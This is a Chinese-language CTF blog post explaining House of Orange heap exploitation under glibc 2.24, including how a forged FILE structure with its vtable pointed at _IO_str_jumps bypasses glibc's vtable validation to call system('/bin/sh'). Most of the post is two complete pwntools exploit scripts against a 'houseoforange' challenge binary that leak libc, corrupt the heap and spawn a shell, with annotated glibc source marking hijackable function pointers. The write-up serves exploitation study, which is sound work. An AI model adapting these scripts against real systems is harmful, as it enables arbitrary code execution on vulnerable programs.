---
title: House_of_Orange在2.24glibc下的利用
date: 2019-03-29 20:40:48
tags:
---

## 0x01 2.24 glibc关于vtable的安全检测

在2.24版本的glibc中，加入了对 vtable 的安全检测，glibc 会在调用虚函数之前在`IO_validate_vtable`函数中，首先检查 vtable 地址的合法性，主要验证方法是根据偏移判断 vtable 是否位于`_IO_vtable` 段中，如果不满足条件会调用函数 `_IO_vtable_check`进一步检测。

```c
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;	//计算_IO_vtable段的长度
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;	//计算虚表地址相对段首的偏移
  if (__glibc_unlikely (offset >= section_length))	//偏移大于段长
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();	//调用_IO_vtable_check ()进一步检测
  return vtable;	//检测正常则返回虚表
}
```

当检测虚表的偏移大于`_IO_vtable` 段长时就会调用`_IO_vtable_check()`做进一步检测

```c
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (_dl_open_hook != NULL
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```

## 0x02 利用 _IO_file_jumps 虚表中的 _IO_str_finish 函数进行利用

_IO_str_jumps 的结构如下

```c
p _IO_str_jumps
$4 = {
  __dummy = 0x0, 
  __dummy2 = 0x0, 
  __finish = 0x7f1ab46f5fa0 <_IO_str_finish>, 
  __overflow = 0x7f1ab46f5c80 <__GI__IO_str_overflow>, 
  __underflow = 0x7f1ab46f5c20 <__GI__IO_str_underflow>, 
  __uflow = 0x7f1ab46f4600 <__GI__IO_default_uflow>, 
  __pbackfail = 0x7f1ab46f5f80 <__GI__IO_str_pbackfail>, 
  __xsputn = 0x7f1ab46f4630 <__GI__IO_default_xsputn>, 
  __xsgetn = 0x7f1ab46f4710 <__GI__IO_default_xsgetn>, 
  __seekoff = 0x7f1ab46f60d0 <__GI__IO_str_seekoff>, 
  __seekpos = 0x7f1ab46f4a00 <_IO_default_seekpos>, 
  __setbuf = 0x7f1ab46f4930 <_IO_default_setbuf>, 
  __sync = 0x7f1ab46f4c00 <_IO_default_sync>, 
  __doallocate = 0x7f1ab46f4a20 <__GI__IO_default_doallocate>, 
  __read = 0x7f1ab46f5ad0 <_IO_default_read>, 
  __write = 0x7f1ab46f5ae0 <_IO_default_write>, 
  __seek = 0x7f1ab46f5ab0 <_IO_default_seek>, 
  __close = 0x7f1ab46f4c00 <_IO_default_sync>, 
  __stat = 0x7f1ab46f5ac0 <_IO_default_stat>, 
  __showmanyc = 0x7f1ab46f5af0 <_IO_default_showmanyc>, 
  __imbue = 0x7f1ab46f5b00 <_IO_default_imbue>
```

### 为什么可以利用函数 _IO_str_finish 获得shell

```c
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF)) //条件
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);// [fp+0xe8]
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

地址fp+0xe8是一个函数指针，函数`_IO_str_finish`会调用其指向的函数，参数是`_IO_buf_base`，如果我们将`_IO_buf_base`修改为"/bin/sh"，接着在fp+0xe8处写入system函数地址，那么就会获得shell

报错时，glibc不会主动调用`_IO_str_finish`函数，所以我们在利用时将vtable的地址减小了`0x8`这样程序报错时调用`_IO_str_overflow`虚表函数时，其实调用的是`_IO_str_finish`函数

再加上`_IO_flush_all_lockp`中触发`OVERFLOW`的条件

条件为
- fp->_IO_write_ptr > fp->_IO_write_base
- fp->_mode <= 0
- fp->_IO_buf_base 为真
- !(fp->_flags & _IO_USER_BUF) 为真

总结利用条件为
- fp->_IO_write_ptr =1
- fp->_IO_write_base =0
- fp->_mode = 0
- _IO_buf_base写入"/bin/sh"的地址
- fp->_flags = 0

exp如下

```python
#/usr/bin/env python
from pwn import *

p = process(['/opt/glibc-2.24/lib/ld-linux-x86-64.so.2','--library-path','/opt/glibc-2.24/lib/','./houseoforange'])
elf = ELF('./houseoforange')
libc = ELF('/opt/glibc-2.24/lib/libc-2.24.so')

DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def z(a=''):
	gdb.attach(p)
	raw_input(a)

def build(length,name):
	p.recvuntil('Your choice : ')
	p.sendline('1')
	p.recvuntil('Length of name :')
	p.sendline(str(length))
	p.recvuntil('Name :')
	p.send(name)
	p.recvuntil('Price of Orange:')
	p.sendline('2')
	p.recvuntil('Color of Orange:')
	p.sendline('2')
	p.recvuntil('Finish')

def see():
	p.recvuntil('Your choice :')
	p.sendline('2')

def upgrade(length,name):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Length of name :')
	p.sendline(str(length))
	p.recvuntil('Name:')
	p.send(name)
	p.recvuntil('Price of Orange: ')
	p.sendline('2')
	p.recvuntil('Color of Orange: ')
	p.sendline('2')
	p.recvuntil('Finish')


def pwn():
	#step1. alter the top chunk's size
	build(0x10,'aaaa')
	payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)
	upgrade(0x100,payload)
	build(0x1000,'cccccccc')
	
	#step2. leak the address of libc
	build(0x400,'aaaaaaaa')	#chunk*
	see()
	p.recvuntil('a'*8)
	addr = u64(p.recvline()[:-1].ljust(8,'\x00'))
	libc_base = addr - 1640 - 0x398b00
	log.success('libc_base:'+hex(libc_base))
	system_addr = libc_base + libc.symbols['system']
	log.success('system_addr: '+hex(system_addr))
	
	#step3. calc the addr
	binsh_addr = libc_base + next(libc.search('/bin/sh\x00'))
	log.success('binsh_addr: '+hex(binsh_addr))
	_IO_list_all_addr = libc_base+libc.symbols['_IO_list_all']
	log.success('_IO_list_all_addr: '+hex(_IO_list_all_addr))
	_IO_str_jumps = libc_base + libc.symbols['_IO_str_jumps']
	log.success('_IO_str_jumps:'+hex(_IO_str_jumps))

	payload = 'a'*0x400
	payload += p64(0)+p64(0x21)+p32(1)+p32(0x1f)+p64(0)	

	fake_file = p64(0) + p64(0x61)
	fake_file += p64(0) + p64(_IO_list_all_addr-0x10)
	fake_file += p64(0) + p64(1)
	fake_file += p64(0)	
	fake_file += p64(binsh_addr)	#_IO_buf_base
	fake_file = fake_file.ljust(0xc0,'\x00')
	fake_file += p64(0) #mode<=0
	fake_file += p64(0)
	fake_file += p64(0)
	fake_file += p64(_IO_str_jumps-0x8)#pointer to vtable
	fake_file = fake_file.ljust(0xe8,'\x00')
	fake_file += p64(system_addr)
	payload += fake_file

	upgrade(0x800,payload)	
	p.recvuntil('Your choice : ')
	p.sendline('1')
	p.interactive()

if __name__ == '__main__':
	pwn()
```

使用模块

```python
#/usr/bin/env python
from pwn import *

p = process(['/opt/glibc-2.24/lib/ld-linux-x86-64.so.2','--library-path','/opt/glibc-2.24/lib/','./houseoforange'])
elf = ELF('./houseoforange')
libc = ELF('/opt/glibc-2.24/lib/libc-2.24.so')

DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context(log_level = 'debug')

def z(a=''):
	gdb.attach(p)
	raw_input(a)

def build(length,name):
	p.recvuntil('Your choice : ')
	p.sendline('1')
	p.recvuntil('Length of name :')
	p.sendline(str(length))
	p.recvuntil('Name :')
	p.send(name)
	p.recvuntil('Price of Orange:')
	p.sendline('2')
	p.recvuntil('Color of Orange:')
	p.sendline('2')
	p.recvuntil('Finish')

def see():
	p.recvuntil('Your choice :')
	p.sendline('2')

def upgrade(length,name):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Length of name :')
	p.sendline(str(length))
	p.recvuntil('Name:')
	p.send(name)
	p.recvuntil('Price of Orange: ')
	p.sendline('2')
	p.recvuntil('Color of Orange: ')
	p.sendline('2')
	p.recvuntil('Finish')


def pwn():
	#step1. alter the top chunk's size
	build(0x10,'aaaa')
	payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)
	upgrade(0x100,payload)
	build(0x1000,'cccccccc')
	
	#step2. leak the address of libc
	build(0x400,'aaaaaaaa')	#chunk*
	see()
	p.recvuntil('a'*8)
	addr = u64(p.recvline()[:-1].ljust(8,'\x00'))
	libc_base = addr - 1640 - 0x398b00
	log.success('libc_base:'+hex(libc_base))
	system_addr = libc_base + libc.symbols['system']
	log.success('system_addr: '+hex(system_addr))
	
	#step3. calc the addr
	binsh_addr = libc_base + next(libc.search('/bin/sh\x00'))
	log.success('binsh_addr: '+hex(binsh_addr))
	_IO_list_all_addr = libc_base+libc.symbols['_IO_list_all']
	log.success('_IO_list_all_addr: '+hex(_IO_list_all_addr))
	_IO_str_jumps = libc_base + libc.symbols['_IO_str_jumps']
	log.success('_IO_str_jumps:'+hex(_IO_str_jumps))

	payload = 'a'*0x400
	payload += p64(0)+p64(0x21)+p32(1)+p32(0x1f)+p64(0)	

	from FILE import *
	context.arch = 'amd64'
	fake_file = IO_FILE_plus_struct()
	fake_file._flags = 0
	fake_file._IO_read_ptr = 0x61
	fake_file._IO_read_base =  _IO_list_all_addr-0x10
	fake_file._IO_write_base = 0
	fake_file._IO_write_ptr = 1
	fake_file._IO_buf_base = binsh_addr
	fake_file._mode = 0
	fake_file.vtable = _IO_str_jumps-0x8
	payload += str(fake_file).ljust(0xe8,'\x00')
	payload += p64(system_addr)

	upgrade(0x800,payload)	
	p.recvuntil('Your choice : ')
	p.sendline('1')
	p.interactive()

if __name__ == '__main__':
	pwn()

```



## 0x03 利用 _IO_file_jumps 虚表中的 _IO_str_overflow 函数进行利用

 `_IO_str_overflow`的定义如下

```c
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)// pass
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in 
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */ // pass
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)//pass 一般会通过
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);//target [fp+0xe0]
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)
```

## REFERENCE

<https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/>